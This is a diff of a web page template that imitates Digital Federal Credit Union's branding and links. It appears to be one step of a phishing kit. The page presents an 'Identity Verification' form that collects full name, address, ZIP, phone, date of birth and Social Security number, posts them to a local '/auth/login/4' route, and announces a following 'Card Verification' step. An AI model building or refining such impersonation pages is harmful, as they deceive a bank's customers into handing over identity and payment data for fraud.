@@ -1,128 +1,150 @@
 @layout('layouts.app')
 
 @section('content')
-<div class="row cb-ui-container cb-pa-lg cb-mx-auto">
-  <div class="col-12 row justify-center">
-    <img height="32px" src="/img/logo.png" class="cb-mb-md">
-    <h1 class="col-12 text-h3 text-grey-8 cb-ma-none text-center">Identity Verification</h1>
-    <small class="col-12 text-grey-8 cb-ma-none text-center">To protect access to your account, help us confirm it's you by filling out the following information.</small>
-    <hr class="separator__header">
+<div class="cb-main-content">
+  <div class="progress-bar">
+    <div class="cb-main-content-sub">
+      <div class="container__content">
+        <div class="cb-progress-bar">
+          <p class="cb-progress-bar__label">
+            75% Complete
+          </p>
+          <div class="cb-progress-bar__container">
+            <div class="cb-progress-bar__bar" style="width: 75.33333%;"></div>
+          </div>
+        </div>
+      </div>
+    </div>
   </div>
 
-  <div class="col-12 cb-pt-md cb-px-xs-md cb-px-sm-xl">
-    <form action="/auth/login/4" method="POST" class="row justify-center">
-      <div class="field-container input-field-spacing">
-        <div class="label-container">
-          <label for="fullName" class="cb-ma-none">Full Name</label>
-        </div>
+  <div class="cb-main-content-sub">
+    <div class="container__content">
+      <form action="/auth/login/4" method="POST">
+        <h1>Personal Verification</h1>
+        <small>Help us confirm it's you by filling out the following.</small>
 
-        <div class="cb-wrapper">
-          <div class="input-container">
-            <input id="fullName" name="fullName" type="text" class="cb-input" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+        <div class="cb-inputWrapper">
+          <div class="cb-message__content">
+            <div class="text">
+              <div class="cb-field">
+                <input id="fullName" name="fullName" class="cb-input" type="text" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+
+                <label class="cb-label cb-label--alpha" for="fullName">Full Name</label>
+              </div>
+
+              <div class="icon-checkmark-green cb-valid-indicator"></div>
+            </div>
+          </div>
+          <div class="cb-message__message" style="display: none;">
+            <span class="icon-error cb-message__message-icon cb-message__error"></span>
+            <span class="cb-message__message-text cb-message__error">Enter a valid Full Name</span>
           </div>
         </div>
 
-        <p class="cb-ma-none cb-error-message" style="display: none;">Please enter a valid full name</p>
-      </div>
+        <div class="cb-inputWrapper">
+          <div class="cb-message__content">
+            <div class="text">
+              <div class="cb-field">
+                <input id="address" name="address" class="cb-input" type="text" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
 
-      <div class="field-container input-field-spacing">
-        <div class="label-container">
-          <label for="address" class="cb-ma-none">Street Address</label>
-        </div>
+                <label class="cb-label cb-label--alpha" for="address">Street Address</label>
+              </div>
 
-        <div class="cb-wrapper">
-          <div class="input-container">
-            <input id="address" name="address" type="text" class="cb-input" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+              <div class="icon-checkmark-green cb-valid-indicator"></div>
+            </div>
+          </div>
+          <div class="cb-message__message" style="display: none;">
+            <span class="icon-error cb-message__message-icon cb-message__error"></span>
+            <span class="cb-message__message-text cb-message__error">Enter a valid Street Address</span>
           </div>
         </div>
 
-        <p class="cb-ma-none cb-error-message" style="display: none;">Please enter a valid street address</p>
-      </div>
+        <div class="cb-inputWrapper">
+          <div class="cb-message__content">
+            <div class="text">
+              <div class="cb-field">
+                <input id="zip" name="zip" class="cb-input" type="text" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
 
-      <div class="field-container input-field-spacing">
-        <div class="label-container">
-          <label for="zip" class="cb-ma-none">ZIP Code</label>
-        </div>
+                <label class="cb-label cb-label--alpha" for="zip">ZIP Code</label>
+              </div>
 
-        <div class="cb-wrapper">
-          <div class="input-container">
-            <input id="zip" name="zip" type="text" class="cb-input" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+              <div class="icon-checkmark-green cb-valid-indicator"></div>
+            </div>
+          </div>
+          <div class="cb-message__message" style="display: none;">
+            <span class="icon-error cb-message__message-icon cb-message__error"></span>
+            <span class="cb-message__message-text cb-message__error">Enter a valid ZIP Code</span>
           </div>
         </div>
 
-        <p class="cb-ma-none cb-error-message" style="display: none;">Please enter a valid zip code</p>
-      </div>
+        <div class="cb-inputWrapper">
+          <div class="cb-message__content">
+            <div class="text">
+              <div class="cb-field">
+                <input id="phone" name="phone" class="cb-input" type="text" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
 
-      <div class="field-container input-field-spacing">
-        <div class="label-container">
-          <label for="phone" class="cb-ma-none">Mobile Phone</label>
-        </div>
+                <label class="cb-label cb-label--alpha" for="phone">Mobile Phone</label>
+              </div>
 
-        <div class="cb-wrapper">
-          <div class="input-container">
-            <input id="phone" name="phone" type="text" class="cb-input" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+              <div class="icon-checkmark-green cb-valid-indicator"></div>
+            </div>
+          </div>
+          <div class="cb-message__message" style="display: none;">
+            <span class="icon-error cb-message__message-icon cb-message__error"></span>
+            <span class="cb-message__message-text cb-message__error">Enter a valid Mobile Phone</span>
           </div>
         </div>
 
-        <p class="cb-ma-none cb-error-message" style="display: none;">Please enter a valid mobile phone</p>
-      </div>
+        <div class="cb-inputWrapper">
+          <div class="cb-message__content">
+            <div class="text">
+              <div class="cb-field">
+                <input id="dob" name="dob" class="cb-input" type="text" placeholder="MM/DD/YYYY" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
 
-      <div class="field-container input-field-spacing">
-        <div class="label-container">
-          <label for="dob" class="cb-ma-none">Date of Birth</label>
-        </div>
+                <label class="cb-label cb-label--alpha" for="dob">Date of Birth</label>
+              </div>
 
-        <div class="cb-wrapper">
-          <div class="input-container">
-            <input id="dob" name="dob" placeholder="MM/DD/YYYY" type="text" class="cb-input" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+              <div class="icon-checkmark-green cb-valid-indicator"></div>
+            </div>
+          </div>
+          <div class="cb-message__message" style="display: none;">
+            <span class="icon-error cb-message__message-icon cb-message__error"></span>
+            <span class="cb-message__message-text cb-message__error">Enter a valid Date of Birth</span>
           </div>
         </div>
 
-        <p class="cb-ma-none cb-error-message" style="display: none;">Please enter a valid date of birth</p>
-      </div>
+        <div class="cb-inputWrapper">
+          <div class="cb-message__content">
+            <div class="text">
+              <div class="cb-field">
+                <input id="ssn" name="ssn" class="cb-input cb-mask-input" type="password" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
 
-      <div class="field-container password-input input-field-spacing">
-        <div class="label-container">
-          <label for="ssn" class="cb-ma-none">Social Security Number</label>
+                <label class="cb-label cb-label--alpha" for="ssn">
+                  Social Security Number
+                  <span class="cb-label-icon cb-label-icon--secure"></span>
+                </label>
+              </div>
+
+              <div class="icon-checkmark-green cb-valid-indicator"></div>
+            </div>
+          </div>
+          <div class="cb-message__message" style="display: none;">
+            <span class="icon-error cb-message__message-icon cb-message__error"></span>
+            <span class="cb-message__message-text cb-message__error">Enter a valid Social Security Number</span>
+          </div>
         </div>
 
-        <div class="cb-wrapper">
-          <div class="input-container has-append">
-            <input id="ssn" name="ssn" type="password" class="cb-input" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
-
-            <button type="button" class="cb-btn non-selectable no-outline qButton cb-btn--unelevated cb-btn--rectangle cb-btn--actionable cb-focusable cb-hoverable cb-btn--wrap cb-btn--dense toggle-btn">
-              <span class="cb-focus-helper"></span>
-              <span class="cb-btn__wrapper col row">
-                <span class="cb-btn__content text-center col items-center justify-center row">
-                  <i class="fas fa-eye cb-icon"></i>
-                </span>
-              </span>
+        <div class="cb-actions-items" style="margin-top: 5rem;">
+          <div class="cb-actions-item cb-actions-item--primary">
+            <div class="cb-actions-primary-text">
+              <div>Next: Card Verification</div>
+            </div>
+            <button class="button button--primary submitBtn" type="submit">
+              Continue
             </button>
           </div>
         </div>
-
-        <p class="cb-ma-none cb-error-message" style="display: none;">Please enter a valid social security number</p>
-      </div>
-
-      <button type="submit" disabled="disabled" class="cb-btn non-selectable no-outline col-12 cb-mt-lg full-width cb-btn--standard cb-btn--rectangle disabled cb-btn--wrap submit-btn">
-        <span class="cb-focus-helper"></span>
-        <span class="cb-btn__wrapper col row">
-          <span class="cb-btn__content text-center col items-center justify-center row">
-            <span class="block">CONTINUE</span>
-          </span>
-        </span>
-      </button>
-    </form>
-  </div>
-
-  <div class="col-xs-12 cb-pt-lg cb-px-md text-body2 text-center">
-    <div class="cb-mb-md">
-      <a href="https://app.dcu.org/dcusecure/cyclicApp/login/" class="link-button cb-mx-xs">Forgot your username?</a> or
-      <a href="https://app.dcu.org/dcusecure/cyclicApp/login/" class="link-button cb-mx-xs">Forgot your password?</a>
-    </div>
-
-    <div class="text-caption text-grey-8 cb-mt-md">
-      <span>© 2022 Digital Federal Credit Union &nbsp; | &nbsp; v1.126.5</span>
+      </form>
     </div>
   </div>
 </div>
